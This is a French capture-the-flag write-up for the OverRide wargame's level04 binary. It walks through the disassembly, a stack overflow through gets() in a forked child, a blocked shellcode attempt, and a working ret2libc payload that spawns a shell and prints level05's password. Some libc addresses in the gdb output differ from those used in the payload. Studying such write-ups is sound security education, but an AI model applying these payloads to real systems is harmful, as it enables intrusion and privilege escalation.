Nous sommes ici en presence d'un binaire level04 qui fait la chose suivante : 
level04@OverRide:~$ ./level04
Give me some shellcode, k

child is exiting...

Etudions le programme grace a gdb
(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   %ebp
   0x080486c9 <+1>:	mov    %esp,%ebp
   0x080486cb <+3>:	push   %edi
   0x080486cc <+4>:	push   %ebx
   0x080486cd <+5>:	and    $0xfffffff0,%esp
   0x080486d0 <+8>:	sub    $0xb0,%esp
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   0x080486e2 <+26>:	lea    0x20(%esp),%ebx
   0x080486e6 <+30>:	mov    $0x0,%eax
   0x080486eb <+35>:	mov    $0x20,%edx
   0x080486f0 <+40>:	mov    %ebx,%edi
   0x080486f2 <+42>:	mov    %edx,%ecx
   0x080486f4 <+44>:	rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:	movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:	movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:	cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	movl   $0x1,0x4(%esp)
   0x0804871b <+83>:	movl   $0x1,(%esp)
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	movl   $0x0,0xc(%esp)
   0x0804872f <+103>:	movl   $0x0,0x8(%esp)
   0x08048737 <+111>:	movl   $0x0,0x4(%esp)
   0x0804873f <+119>:	movl   $0x0,(%esp)
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	movl   $0x8048903,(%esp)
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    0x20(%esp),%eax
   0x0804875b <+147>:	mov    %eax,(%esp)
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    0x1c(%esp),%eax
   0x0804876d <+165>:	mov    %eax,(%esp)
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    0x1c(%esp),%eax
   0x08048779 <+177>:	mov    %eax,0xa0(%esp)
   0x08048780 <+184>:	mov    0xa0(%esp),%eax
   0x08048787 <+191>:	and    $0x7f,%eax
   0x0804878a <+194>:	test   %eax,%eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    0x1c(%esp),%eax
   0x08048792 <+202>:	mov    %eax,0xa4(%esp)
   0x08048799 <+209>:	mov    0xa4(%esp),%eax
   0x080487a0 <+216>:	and    $0x7f,%eax
   0x080487a3 <+219>:	add    $0x1,%eax
   0x080487a6 <+222>:	sar    %al
   0x080487a8 <+224>:	test   %al,%al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	movl   $0x804891d,(%esp)
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:	movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:	mov    0xac(%esp),%eax
   0x080487d1 <+265>:	mov    %eax,0x4(%esp)
   0x080487d5 <+269>:	movl   $0x3,(%esp)
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:	cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
---Type <return> to continue, or q <return> to quit---
   0x080487f6 <+302>:	movl   $0x8048931,(%esp)
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	movl   $0x9,0x4(%esp)
   0x0804880a <+322>:	mov    0xac(%esp),%eax
   0x08048811 <+329>:	mov    %eax,(%esp)
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    $0x0,%eax
   0x0804881f <+343>:	lea    -0x8(%ebp),%esp
   0x08048822 <+346>:	pop    %ebx
   0x08048823 <+347>:	pop    %edi
   0x08048824 <+348>:	pop    %ebp
   0x08048825 <+349>:	ret
End of assembler dump.

Nous voyons ici un appel a fork() qui va lancer un processus enfant.
Nous remarquons egalement que lorsque nous essayons de faire segfault le programme ce dernier dne reagis plus du tout a moins d'interrompre manuellement l'execution.

Une option disponible avec gdb et utile pour debugger des programmes qui crees des processus enfant est la suivante : 
set follow-fork-mode child
Une fois cette option set, gdb va suivre le processus enfant a la place du processus parent.

Essayons cette fois de faire segfault le programme toujours dans gdb: 
r < <(python -c 'print "A" * 1000')
Starting program: /home/users/level04/level04 < <(python -c 'print "A" * 1000')
[New process 2464]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2464]
0x41414141 in ?? ()
(gdb) child is exiting...

Nous voyons bien que eip a ete ecrase par 0x41414141
Trouvons l'offset : 156.
Nous allons set un shellcode dans une variable d'environnement comme nous l'avons deja fait auparavant : 
export EGG=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`

Trouvons son adresse : 0xffffd865

Et enfin montons notre exploit :

(python -c 'print "A" * 156 + "\x65\xd8\xff\xff"') | ./level04

Cela ne marche pas et c'est du au fait que ptrace va verifier la presence ou non d'un exec() et ainsi nous retourner no exec() for you

Essayons alors un ret2lib: 
Nous allons avoir besoin de l'adresse de system, de exit et de "/bin/sh"
Adresse de system : 0xf7e6aed0
Adresse de exit : 0xf7e5eb70
Adresse de "/bin/sh" : 0xf7f897ec
Pour trouver /bin/sh : 
> (gdb) start
>
> (gdb) print &system
> $1 = (<text variable, no debug info>*) 0xf7e68250 <system>
>
> (gdb) find &system,+9999999,"/bin/sh"
> 0xf7f86c4c
> warning: Unable to access target memory at 0xf7fd0fd4, halting search.
> 1 pattern found.



Exploit :
python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7"' > /tmp/level04
cat /tmp/level04 - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
